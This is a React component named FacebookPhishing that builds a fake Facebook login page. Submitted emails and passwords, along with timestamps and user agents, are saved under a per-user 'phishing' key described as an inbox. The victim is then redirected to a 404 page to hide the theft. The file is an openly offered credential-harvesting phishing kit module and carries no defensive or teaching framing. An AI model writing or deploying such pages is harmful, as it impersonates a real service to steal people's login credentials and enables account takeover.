
import { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';

const FacebookPhishing = () => {
  const { userId } = useParams();
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    email: '',
    password: ''
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    // Save captured data to user's inbox
    const capturedData = {
      platform: 'Facebook',
      email: formData.email,
      password: formData.password,
      timestamp: Date.now(),
      ip: 'Unknown',
      userAgent: navigator.userAgent
    };

    const existingData = JSON.parse(localStorage.getItem(`phishing_${userId}`) || '[]');
    existingData.push(capturedData);
    localStorage.setItem(`phishing_${userId}`, JSON.stringify(existingData));

    // Redirect to 404 page
    navigate('/404-not-found');
  };

  return (
    <div className="min-h-screen bg-white">
      <div className="bg-blue-600 px-4 py-3">
        <div className="max-w-md mx-auto">
          <h1 className="text-white text-2xl font-bold">facebook</h1>
        </div>
      </div>
      
      <div className="max-w-md mx-auto px-4 py-8">
        <div className="text-center mb-8">
          <div className="w-16 h-16 bg-blue-600 rounded-full flex items-center justify-center mx-auto mb-4">
            <span className="text-white text-2xl font-bold">f</span>
          </div>
          <h2 className="text-gray-800 text-xl mb-2">Log in to Facebook</h2>
          <p className="text-gray-600 text-sm">Enter your email and password</p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          <Input
            type="text"
            placeholder="Email address or phone number"
            value={formData.email}
            onChange={(e) => setFormData({...formData, email: e.target.value})}
            className="w-full h-12 border-gray-300 rounded text-gray-800 bg-white"
            required
          />
          
          <Input
            type="password"
            placeholder="Password"
            value={formData.password}
            onChange={(e) => setFormData({...formData, password: e.target.value})}
            className="w-full h-12 border-gray-300 rounded text-gray-800 bg-white"
            required
          />

          <Button 
            type="submit"
            className="w-full bg-blue-600 hover:bg-blue-700 text-white h-12 text-lg font-semibold"
          >
            Log In
          </Button>
        </form>

        <div className="text-center mt-6">
          <a href="#" className="text-blue-600 text-sm">Forgotten password?</a>
        </div>

        <div className="flex items-center my-6">
          <div className="flex-1 border-t border-gray-300"></div>
          <span className="px-4 text-gray-500 text-sm">or</span>
          <div className="flex-1 border-t border-gray-300"></div>
        </div>

        <Button className="w-full bg-green-500 hover:bg-green-600 text-white h-12 font-semibold">
          Create New Account
        </Button>
      </div>
    </div>
  );
};

export default FacebookPhishing;
